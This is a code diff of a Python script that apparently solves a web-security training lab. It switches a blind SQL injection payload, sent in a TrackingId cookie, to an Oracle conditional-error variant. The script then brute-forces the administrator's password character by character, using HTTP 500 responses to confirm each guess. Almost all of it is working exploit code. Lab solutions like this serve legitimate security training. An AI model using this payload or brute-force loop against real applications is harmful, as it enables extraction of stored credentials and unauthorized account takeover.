@@ -1,8 +1,8 @@
 from lib import (
     SESSION,
-    login_as_administrator,
     check_is_lab_solved,
     generate_parser,
+    login_as_administrator,
 )
 import re
 from string import ascii_lowercase, digits
@@ -20,17 +20,15 @@ def bruteforce_admin_password(position: int) -> str | None:
         response = SESSION.get(
             f"{lab_url}/",
             cookies={
-                "TrackingId": f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{character}' --"
+                "TrackingId": f"{tracking_id}' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {position}, 1) = '{character}') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a' --"
             },
         )
 
-        if response.status_code == 200:
-            if "Welcome back!" in response.text:
-                print(f"[~] Ended bruteforcing position {position}")
-                return character
-
-            else:
-                continue
+        if response.status_code == 500:
+            print(f"[~] Ended bruteforcing position {position}")
+            return character
+        else:
+            continue
 
     print(f"[~] Ended bruteforcing position {position}")
 
